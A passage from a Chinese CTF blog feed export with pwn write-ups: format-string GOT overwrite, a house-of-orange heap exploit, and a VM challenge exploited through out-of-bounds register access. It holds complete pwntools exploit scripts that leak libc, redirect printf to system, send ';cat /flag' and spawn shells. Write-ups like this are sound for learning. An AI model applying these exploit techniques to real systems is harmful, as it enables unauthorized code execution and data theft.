DEFAULT  UND printf@GLIBC_2.2.5 (2)</span><br><span class="line">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.2.5 (2)</span><br><span class="line">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)</span><br><span class="line">     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)</span><br><span class="line">     9: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND gmon_start</span><br><span class="line">    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@GLIBC_2.2.5 (2)</span><br><span class="line">    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)</span><br><span class="line">    12: 0000000000601080     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2)</span><br><span class="line">    13: 0000000000601090     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (2)</span><br><span class="line">    14: 00000000006010a0     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5 (2)</span><br></pre></td></tr></table></figure><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><p>根据这个txt,完全可以算出printf_got表地址。存放stdout的地址为601080，这个地址同时也是bss段的开头地址，bss地址和got表地址相差0x20，这个也是随便打开一个64位程序能得到的偏移。然后也是泄露地址，确定偏移量，然后格式化字符串构造。不过可惜没拿到一血，当时因为有其他事情，晚做了三四个小时。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'47.108.135.45'</span>,<span class="number">20162</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">addr=<span class="number">0x601080</span><span class="number">-0x20</span><span class="number">-0x8</span></span><br><span class="line">payload=<span class="string">'%9$s'</span>.ljust(<span class="number">8</span>,<span class="string">'a'</span>)+p64(addr)</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'Repeater:'</span>)</span><br><span class="line">printf_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"sprintf"</span>,printf_addr)</span><br><span class="line">system=printf_addr-libc.dump(<span class="string">"sprintf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line"><span class="comment">#system=0x666666666666</span></span><br><span class="line">printf=<span class="number">0x601080</span><span class="number">-0x20</span><span class="number">-0x38</span><span class="number">-8</span></span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>)<span class="number">-0x9</span>)+<span class="string">'c%12$hn'</span>+<span class="string">'%'</span>+str(((system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-((system&amp;<span class="number">0xffff</span>)<span class="number">-0x9</span>)<span class="number">-0x9</span>)+<span class="string">'c%13$hn'</span></span><br><span class="line">payload+=(<span class="number">32</span>-len(payload))*<span class="string">'a'</span>+p64(printf)+p64(printf+<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">';cat /flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-heap"><a href="#0x03-heap" class="headerlink" title="0x03 heap"></a>0x03 heap</h2><h3 id="introduction-2"><a href="#introduction-2" class="headerlink" title="introduction"></a>introduction</h3><p>介绍很简单，就是一个堆，给了二进制文件,给了libc2.23。</p><h3 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit"></a>exploit</h3><p>分析它的伪代码，发现有一个off-by-null，并且最开始有一个格式化字符串漏洞。但是限制开辟堆块大小，必须为0x80以上的堆块。然后这一题有两种解法，一种是house of orange,还有一种就是unlink。unlink比较简单。说一下unlink的思路吧，最初泄露出pie，然后就是常规unlink。下面是我用house of orange做的。最初泄露__libc_start_main，然后确定libc基址。然后利用house of orange,造成堆块重叠，最后构造fake_file，然后getshell。</p><p>下面是我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p=process(<span class="string">"./pwn1"</span>)</span><br><span class="line"><span class="comment">#p=remote('47.108.135.45',20162)</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,index,content)</span>:</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the index you want to create (0-10):'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Enter a size:\n"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the content: \n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Enter an index:\n"</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Enter an index:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the content: \n'</span>,content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter your name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'%15$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello, 0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-240</span></span><br><span class="line">libc_base=libc_start_main-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="number">1</span>,<span class="string">'c'</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="number">2</span>,<span class="string">'b'</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="number">3</span>,<span class="string">'c'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x100</span>+p64(<span class="number">0x210</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake_file)</span><br><span class="line">create(<span class="number">0x1e0</span>,<span class="number">4</span>,<span class="string">'cat /flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;summary&quot;&gt;&lt;a href=&quot;#summary&quot; class=&quot;headerlink&quot; title=&quot;summary&quot;&gt;&lt;/a&gt;summary&lt;/h2&gt;&lt;p&gt;简单说一下这个比赛，感觉这个比赛难度还是不错的，刚刚好，侥幸拿到了一个一血。其中有三道盲打pwn，两
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
    
    
      <category term="盲打pwn" scheme="http://Whali3n51.github.io/tags/%E7%9B%B2%E6%89%93pwn/"/>
    
      <category term="格式化字符串" scheme="http://Whali3n51.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>ReaHat_final_pwn</title>
    <link href="http://whali3n51.github.io/2019/11/28/RedHat/"/>
    <id>http://whali3n51.github.io/2019/11/28/RedHat/</id>
    <published>2019-11-28T15:30:00.000Z</published>
    <updated>2020-01-08T06:54:30.227Z</updated>
    
    <content type="html"><![CDATA[<p>最近做了vm的pwnt题才发现Vm的pwn题是真的有意思，做vm的关键在于逆向，我的逆向太菜了，逆的太慢了，做题速度直接与逆向速度挂钩，导致就做出来一道题，哭了。随便提一句有的没的，广州是真的好，主办方是我见过最良心的主办方，大气+多金。还有一道关于json的pwn,我实在是做不出来，就不写了。</p><h2 id="0x01粤湾中心"><a href="#0x01粤湾中心" class="headerlink" title="0x01粤湾中心"></a>0x01粤湾中心</h2><p>这一道题比赛现场没时间做，我的逆向太菜了，当时只看懂了一个大概。赛后也想向其他师傅请教了一下。</p><p>首先拿到这道题看一下开启的保护</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>这一道题不能直接getshell，因为开启了prctl,禁用了execve</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &gt;= <span class="number">0x40000000</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000024</span>  A = count &gt;&gt; <span class="number">32</span> # write(fd, buf, count)</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000020</span>  A = count # write(fd, buf, count)</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  <span class="keyword">if</span> (A == <span class="number">0x10</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这一道题最初打flag文件，然后将fd重定位到了0x233这个地方。所以我们解这一道题的主要思路就是将fileno的值改为0x233，然后当程序读取输入的时候，自动去0x233这个地方读取输入，然后再将输入打印出来，刚好本题结尾处就有这样的条件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Could you tell me your name?"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%99s"</span>, &amp;v0);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Goodbye~ %s\n"</span>, &amp;v0);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"See you next time."</span>);</span><br></pre></td></tr></table></figure><p>所以我们现在只需要将fileno该为0x233就可以了。</p><p>这一题提供了加减乘除等等指令。这个题的漏洞就是在读取寄存器的时候，没有对索引值进行检查，导致了越界读写。因此将栈地址改为fileno的地址，通过入栈操作就可以将该题fileno修改了。不过计算起来贼麻烦，我没有自己算，哈哈哈哈哈哈哈 ，贴一下其他师傅的脚本吧。</p><p>下面脚本是ditto师傅的，他的博客链接：<a href="http://dittozzz.top/" target="_blank" rel="noopener">http://dittozzz.top/</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./RHVM.bin"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line"><span class="comment">#context.terminal=["tmux","splitw","-h"]</span></span><br><span class="line">elf=ELF(exec_file,checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">"i386"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">"amd64"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    set $reg = ($text_base+0x0000000000203060)</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000001B15)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opcode</span><span class="params">(op,idx1,idx2)</span>:</span></span><br><span class="line">    p = (op&lt;&lt;<span class="number">16</span>) | (idx1&lt;&lt;<span class="number">8</span>) | idx2 </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(len)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"EIP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"ESP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Give me code length: \n"</span>,str(len))</span><br><span class="line">    a.recvuntil(<span class="string">"Give me code: \n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span><span class="params">(idx1,value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x40</span>,idx1,value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovDataToReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x42</span>,idx1,idx2)<span class="comment">#reg[reg[idx1]] = data[reg[idx2]]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovRegToData</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x41</span>,idx1,idx2)<span class="comment">#data[reg[idx1]] = reg[idx2]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xd0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xa0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeftShift</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xe0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PushReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x70</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PopReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x80</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MulReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xc0</span>,idx1,idx2)</span><br><span class="line">payload = [</span><br><span class="line"></span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),<span class="comment"># reg[1] = 12</span></span><br><span class="line">    Read(<span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = 0-8=-4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = -16</span></span><br><span class="line">    Read(<span class="number">3</span>,<span class="number">4</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>),<span class="comment"># reg[4] = data[-16]</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -15</span></span><br><span class="line">    AddReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 5</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>), <span class="comment"># get stderr addr</span></span><br><span class="line">    Read(<span class="number">6</span>,<span class="number">5</span>),<span class="comment">#reg[6] = 5</span></span><br><span class="line">    Read(<span class="number">7</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">2</span>),<span class="comment">#reg[7]= 9</span></span><br><span class="line">    LeftShift(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">5</span>),</span><br><span class="line">    LeftShift(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">6</span>),<span class="comment"># ==&gt; stdin.fileno</span></span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">3</span>),<span class="comment"># ==&gt; stdin.fileno-4</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment">#reg[0] = -15+8 = -7</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -8</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -9</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">5</span>),</span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -10</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">    MulReg(<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">3</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">7</span>),</span><br><span class="line">    PushReg(<span class="number">1</span>)<span class="comment"># fileno ==&gt; 0x233</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">Init(len(payload))</span><br><span class="line">debug()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a.sendline(str(i))</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-粤湾银行"><a href="#0x02-粤湾银行" class="headerlink" title="0x02 粤湾银行"></a>0x02 粤湾银行</h2><p>这是一道32位的pwn,比赛的时候没逆清楚，赛后复现出来了。</p><p>开启保护：</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>该题的结构体</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>Vminfo          struc ; (sizeof=<span class="number">0</span>x2C)</span><br><span class="line"><span class="symbol">00000000 </span>reg             dd <span class="number">6</span> dup(?)</span><br><span class="line"><span class="symbol">00000018 </span>_ESP            dd ?</span><br><span class="line"><span class="number">0000001</span>C _EBP            dd ?</span><br><span class="line"><span class="symbol">00000020 </span>_EIP            dd ?</span><br><span class="line"><span class="symbol">00000024 </span>field_24        dd ?</span><br><span class="line"><span class="symbol">00000028 </span>stack_ptr       dd ?</span><br><span class="line"><span class="number">0000002</span>C Vminfo          ends</span><br></pre></td></tr></table></figure><p>这一题用到了三个指令。这一题有三个指令可以达到任意地址读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movimm</span><span class="params">(reg,imm)</span>:</span><span class="comment">#将立即数放到任意寄存器</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x03'</span>+p8(reg)+p32(imm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchar</span><span class="params">()</span>:</span><span class="comment">#打印出reg[3]地址上的一个字节</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x01'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchar</span><span class="params">()</span>:</span><span class="comment">#写一个字节到reg[3]存放的地址上</span></span><br><span class="line"><span 